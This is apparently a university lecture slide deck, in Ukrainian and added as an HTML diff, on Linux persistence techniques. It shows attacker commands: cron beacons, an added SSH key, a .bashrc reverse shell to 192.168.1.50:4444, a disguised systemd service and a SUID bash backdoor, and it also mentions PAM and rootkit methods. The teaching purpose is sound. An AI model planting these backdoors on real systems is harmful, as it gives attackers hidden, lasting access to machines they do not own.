@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 10.3 — Linux Persistence</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="10">
+  <div class="slide-deck">
+    <section class="slide active title-slide">
+      <h1>Linux Persistence</h1>
+      <div class="subtitle">Тема 10.3 — Утримання доступу та обхід антивірусів</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Cron, SSH Keys та Shell Profiles</h2>
+      <div class="three-col-grid" style="margin-top:1rem;">
+        <div class="card-green">
+          <h3>Cron Jobs</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# User cron
+*/5 * * * * /tmp/.beacon.sh
+
+# System cron (root)
+echo "*/5 * * * * root
+  /opt/.update/check.sh"
+  >> /etc/crontab
+          </div>
+        </div>
+        <div class="card-blue">
+          <h3>SSH Keys</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# Додати публічний ключ
+echo "ssh-ed25519 AAAA..."
+  >> ~/.ssh/authorized_keys
+
+# Вхід без паролю:
+ssh -i backdoor_key
+  user@target
+          </div>
+        </div>
+        <div class="card-purple">
+          <h3>.bashrc</h3>
+          <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# При кожному логіні
+echo 'nohup bash -c
+  "bash -i >& /dev/tcp/
+  192.168.1.50/4444 0>&1"
+  &' >> ~/.bashrc
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Systemd та інші методи</h2>
+      <div class="card-yellow" style="margin-bottom:1.5rem;">
+        <h3>Systemd Service (T1543.002)</h3>
+        <div class="code-block" style="margin-top:0.8rem;font-size:0.72em;">
+# /etc/systemd/system/health.service
+[Unit]
+Description=System Health Monitor
+After=network.target
+[Service]
+Type=simple
+ExecStart=/opt/.system/monitor
+Restart=always
+RestartSec=30
+[Install]
+WantedBy=multi-user.target
+
+# systemctl enable health.service && systemctl start health.service
+        </div>
+      </div>
+
+      <table class="comparison-table" style="font-size:0.82em;">
+        <thead><tr><th>Метод</th><th>Привілеї</th><th>Опис</th></tr></thead>
+        <tbody>
+          <tr><td><strong>SUID Backdoor</strong></td><td class="cell-red">root</td><td><code>cp /bin/bash /tmp/.s; chmod u+s /tmp/.s</code></td></tr>
+          <tr><td><strong>LD_PRELOAD</strong></td><td class="cell-red">root</td><td>Підміна функцій через /etc/ld.so.preload</td></tr>
+          <tr><td><strong>PAM Backdoor</strong></td><td class="cell-red">root</td><td>Модифікація PAM для "майстер-пароля"</td></tr>
+          <tr><td><strong>Kernel Module</strong></td><td class="cell-red">root</td><td>LKM rootkit — приховує файли, процеси</td></tr>
+        </tbody>
+      </table>
+    </section>
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls"><button id="btn-prev" onclick="prev()">&#8592;</button><button id="btn-next" onclick="next()">&#8594;</button></div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
